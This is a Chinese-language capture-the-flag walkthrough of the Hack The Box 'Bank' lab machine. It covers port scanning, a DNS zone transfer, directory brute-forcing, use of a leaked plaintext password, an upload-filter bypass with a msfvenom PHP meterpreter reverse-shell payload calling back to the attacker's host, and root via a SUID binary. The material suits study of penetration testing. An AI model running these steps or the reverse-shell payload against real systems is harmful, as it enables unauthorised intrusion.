
# 开放端口
```
┌──(root㉿rock)-[~]
└─# nmap -p- --open 10.10.10.29 -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-23 08:34 EDT
Stats: 0:00:23 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 93.67% done; ETC: 08:35 (0:00:02 remaining)
Nmap scan report for 10.10.10.29
Host is up (0.073s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 25.23 seconds

```


# 详细端口信息

```
┌──(root㉿rock)-[~]
└─# nmap -sV -Pn -A -O 10.10.10.29 -p 22,53,80                                 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-23 08:36 EDT
Nmap scan report for 10.10.10.29
Host is up (0.072s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA)
|   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA)
|   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA)
|_  256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519)
53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.7 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.13 (95%), Linux 3.16 (95%), Linux 3.2 - 4.9 (95%), Linux 4.8 (95%), Linux 4.4 (95%), Linux 4.9 (95%), Linux 3.12 (95%), Linux 3.8 - 3.11 (95%), Linux 4.2 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   72.25 ms 10.10.14.1
2   73.27 ms 10.10.10.29

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.26 seconds

```


# DNS

首先按照htb的习惯，我们假定靶机的域名是bank.htb，依此执行Zone Transfer

```
┌──(root💀kali)-[~/htb/bank]
└─# dig axfr bank.htb @10.10.10.29

; <<>> DiG 9.18.0-2-Debian <<>> axfr bank.htb @10.10.10.29
;; global options: +cmd
bank.htb.               604800  IN      SOA     bank.htb. chris.bank.htb. 5 604800 86400 2419200 604800
bank.htb.               604800  IN      NS      ns.bank.htb.
bank.htb.               604800  IN      A       10.10.10.29
ns.bank.htb.            604800  IN      A       10.10.10.29
www.bank.htb.           604800  IN      CNAME   bank.htb.
bank.htb.               604800  IN      SOA     bank.htb. chris.bank.htb. 5 604800 86400 2419200 604800
;; Query time: 971 msec
;; SERVER: 10.10.10.29#53(10.10.10.29) (TCP)
;; WHEN: Thu Sep 29 01:54:32 EDT 2022
;; XFR size: 6 records (messages 1, bytes 171)

```

果然爆出了几个域名

把```bank.htb，www.bank.htb，ns.bank.htb，chris.bank.htb```全部添加进host文件

```www.bank.htb，ns.bank.htb，chris.bank.htb```导向了apache开始页

```bank.htb```导向一个登陆页面

# web

从bank.htb的登陆页面可知网站是用php写的，我们在爆破目录的时候可以带上php后缀

```
┌──(root㉿rock)-[~]
└─# gobuster dir -t 50  --no-error --url http://bank.htb -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt -x php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://bank.htb
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2022/09/29 14:06:54 Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 305] [--> http://bank.htb/uploads/]
/assets               (Status: 301) [Size: 304] [--> http://bank.htb/assets/] 
/login.php            (Status: 200) [Size: 1974]                              
/support.php          (Status: 302) [Size: 3291] [--> login.php]              
/index.php            (Status: 302) [Size: 7322] [--> login.php]              
/logout.php           (Status: 302) [Size: 0] [--> index.php]                 
/inc                  (Status: 301) [Size: 301] [--> http://bank.htb/inc/]    
/server-status        (Status: 403) [Size: 288]                               
/balance-transfer     (Status: 301) [Size: 314] [--> http://bank.htb/balance-transfer/]
                                                                                       
===============================================================
2022/09/29 14:18:03 Finished
===============================================================

```


```/balance-transfer```页面列出了很多.acc文件，内容大概是：
```
++OK ENCRYPT SUCCESS
+=================+
| HTB Bank Report |
+=================+

===UserAccount===
Full Name: balance-transfer
Email: H7SACcJdBQfDCk1uCXeeEO2WZkpmfwFXExxgKhtl8JYK40eGXsVChXygiYDxujv8Q3pAkTWtDUdHVsnSVjvch3tz167wpCEgF4R0YNtBIHiD9Gw4Z1hh4KQ6QYCgAhxg
Password: mohkbKVUrexBU4GU5XbaH2hy0UPBbmRyK8TWTPQl3oWXsCSxA3Ii5ZR6TGH53zDNIwKBmBXpZUnswfZ7jIppHgvAWdFZMjNuQy6c93C9YZBufBCyj1X0itBfGgetA2Yr
CreditCards: 3
Transactions: 13
Balance: 6423573 .
===UserAccount===
```

# foothold

可以看见有Email和Password字段，但是被加密了。一开始以为是base64，但尝试解密失败

```++OK ENCRYPT SUCCESS```表明加密成功会打印这一行，这个文件可能是某种日志，有成功的就有可能有失败的打印

一个个文件查看不太现实，最好写脚本或者用命令行去比较文件的差异

这里我直接抄0xdf的命令。。

比较页面字数，从低到高排列

```
┌──(root💀kali)-[~/htb/bank]
└─# curl -s http://bank.htb/balance-transfer/ | grep -F '.acc' | grep -Eo '[a-f0-9]{32}\.acc.*"right">.+ ' | cut -d'>' -f1,7 | tr '">' ' ' | sort -k2 -n | head
68576f20e9732f1b2edc4df5b8533230.acc  257 
09ed7588d1cd47ffca297cc7dac22c52.acc  581 
941e55bed0cb8052e7015e7133a5b9c7.acc  581 
052a101eac01ccbf5120996cdc60e76d.acc  582 
0d64f03e84187359907569a43c83bddc.acc  582 
10805eead8596309e32a6bfe102f7b2c.acc  582 
20fd5f9690efca3dc465097376b31dd6.acc  582 
346bf50f208571cd9d4c4ec7f8d0b4df.acc  582 
70b43acf0a3e285c423ee9267acaebb2.acc  582 
780a84585b62356360a9495d9ff3a485.acc  582 

```

有一个字数短了一大半，查看这个文件


```
┌──(root💀kali)-[~/htb/bank]
└─# curl http://bank.htb/balance-transfer/68576f20e9732f1b2edc4df5b8533230.acc
--ERR ENCRYPT FAILED
+=================+
| HTB Bank Report |
+=================+

===UserAccount===
Full Name: Christos Christopoulos
Email: chris@bank.htb
Password: !##HTBB4nkP4ssw0rd!##
CreditCards: 5
Transactions: 39
Balance: 8842803 .
===UserAccount===

```


```--ERR ENCRYPT FAILED```表明加密失败，露出了明文密码

使用这个密码在首页登陆，顺利进入后台


在support页面有一个上传文件功能

查看网页源代码发现这一句

```
[DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG]
```

看来只需要把php后缀换成htb就可以绕过

编译一个php马
```
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.16.3 LPORT=4444 -f raw > shell.php
```

换成htb后缀
```
mv shell.php shell.htb 
```

上传，点击，拿到立足点
```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.16.3:4444 
[*] Sending stage (39860 bytes) to 10.10.10.29
[*] Meterpreter session 1 opened (10.10.16.3:4444 -> 10.10.10.29:40126) at 2022-09-29 02:49:59 -0400

meterpreter > getuid
Server username: www-data

```


# 提权

枚举所有SUID
```
www-data@bank:/home/chris$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/var/htb/bin/emergency
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/at
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/traceroute6.iputils
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/mtr
/usr/sbin/uuidd
/usr/sbin/pppd
/bin/ping
/bin/ping6
/bin/su
/bin/fusermount
/bin/mount
/bin/umount

```
发现一个不常见的SUID

```
/var/htb/bin/emergency
```

尝试执行，直接提权到了root。。
```
www-data@bank:/home/chris$ /var/htb/bin/emergency
/var/htb/bin/emergency
# id
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
# whoami
whoami
root

```